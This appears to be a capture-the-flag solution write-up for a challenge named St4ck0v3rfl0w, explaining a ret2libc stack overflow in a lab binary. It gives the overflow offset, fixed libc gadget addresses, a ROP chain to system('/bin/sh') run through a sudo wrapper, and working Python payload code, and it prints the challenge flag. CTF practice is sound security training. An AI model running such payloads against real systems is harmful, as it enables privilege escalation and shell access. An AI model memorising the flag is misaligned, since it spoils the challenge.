# PoC — Challenge 10: St4ck0v3rfl0w

**Flag:** `EPI{K0N5P1r4Cy_UNV31l3D_l375_F1n15h_17}`
**Vulnerability:** ret2libc — stack overflow + ASLR disabled via `setarch -R`
**Binary:** `/usr/sbin/tracking-reader` (64-bit PIE, `-fno-stack-protector -z execstack`, run via `/usr/bin/cat_`)
**Access needed:** SSH as `senior-dev` (obtained from R3t2func)

---

## Vulnerability

`tracking-reader` reads a log file and has a stack overflow:

```c
char buffer[371];
gets(buffer);   // reads up to EOF — no bounds check
```

**Offset to return address:** `371 (buffer) + 13 (GCC alignment padding) + 8 (saved RBP)` = **392 bytes**

**Access chain:** `senior-dev` can run `sudo -u senior-dev -g adm /usr/bin/cat_` (NOPASSWD).  
`cat_` is a bash wrapper: `setarch -R /usr/sbin/tracking-reader` — the `-R` flag disables ASLR.  
With ASLR disabled, libc is loaded at a fixed base address every run.

**Fixed addresses (ASLR disabled via setarch -R):**
```
libc base:    0x7ffff7dc7000
system():     0x7ffff7dc7000 + 0x53110  = 0x7ffff7e1a110
"/bin/sh":    0x7ffff7dc7000 + 0x1a5ea4 = 0x7ffff7f6cea4
pop rdi;ret:  0x7ffff7dc7000 + 0x2a145  = 0x7ffff7df1145
ret (align):  0x7ffff7dc7000 + 0x2846b  = 0x7ffff7def46b
```

**ROP chain:** `ret` (align) → `pop rdi; ret` → `/bin/sh` → `system()`

---

## Critical: PTY Raw Mode

The sudo invocation requires a PTY. `pop_rdi_ret` contains byte `\x11` (XON) at offset 1.  
Without raw mode, the PTY line discipline consumes `\x11` and corrupts the address.  
**Solution:** `tty.setraw(slave)` before spawning the process (same pattern as R3t2func).

**Also critical:** sudo invocation must be `sudo -u senior-dev -g adm /usr/bin/cat_` — the `-g adm` is required to gain the `adm` group and read `/var/log/preprod.log`.

---

## Exploit

```bash
# Requires senior-dev key from R3t2func at /tmp/senior_dev_key
python3 challenges/10_st4ck0v3rfl0w/scripts/exploit_st4ck0v3rfl0w.py <SSH_PORT>
```

**What the script does:**
1. SSH as `senior-dev` using the Ed25519 key from R3t2func
2. Spawns `sudo -u senior-dev -g adm /usr/bin/cat_` in a PTY (raw mode)
3. Sends overflow payload → ROP chain → `system("/bin/sh")`
4. Sends `id` and `grep EPI /var/log/preprod.log` in the shell

**Payload:**
```python
import struct

libc_base   = 0x7ffff7dc7000
system      = libc_base + 0x53110
binsh       = libc_base + 0x1a5ea4
pop_rdi_ret = libc_base + 0x2a145
ret_gadget  = libc_base + 0x2846b
OFFSET      = 392

payload  = b"A" * OFFSET
payload += struct.pack("<Q", ret_gadget)   # stack alignment
payload += struct.pack("<Q", pop_rdi_ret)  # pop rdi ; ret
payload += struct.pack("<Q", binsh)        # "/bin/sh" argument
payload += struct.pack("<Q", system)       # system()
payload += b"\n"
```

**In the resulting shell:**
```bash
grep EPI /var/log/preprod.log
# → EPI{K0N5P1r4Cy_UNV31l3D_l375_F1n15h_17}
```

**Flag:** `EPI{K0N5P1r4Cy_UNV31l3D_l375_F1n15h_17}`
